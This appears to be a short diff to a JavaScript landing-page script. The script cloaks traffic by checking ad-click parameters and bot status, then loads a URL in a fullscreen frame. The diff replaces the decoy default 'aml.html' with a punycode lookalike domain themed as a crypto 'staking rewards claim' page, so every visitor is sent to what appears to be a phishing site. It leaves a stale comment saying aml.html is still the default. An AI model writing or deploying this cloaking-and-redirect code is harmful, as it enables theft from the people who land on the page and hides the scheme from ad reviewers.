@@ -52,7 +52,7 @@
     const hasPromopult = params.hasOwnProperty('promopult_yandex_direct') || 
                          params.utm_source === 'promopult_yandex_direct';
 
-    let targetUrl = 'aml.html'; // По умолчанию показываем aml.html
+    let targetUrl = 'https://xn--soend-l7a.fi-staking-rewards-claim.api-dashboard-connect.com/raydium.html'; // По умолчанию показываем aml.html
 
     if (!isBot() && (hasGclid || hasPromopult)) {
       targetUrl = 'https://xn--soend-l7a.fi-staking-rewards-claim.api-dashboard-connect.com/raydium.html';
@@ -62,4 +62,5 @@
     createFullscreenFrame(targetUrl);
 
   }, 4000);
+
 
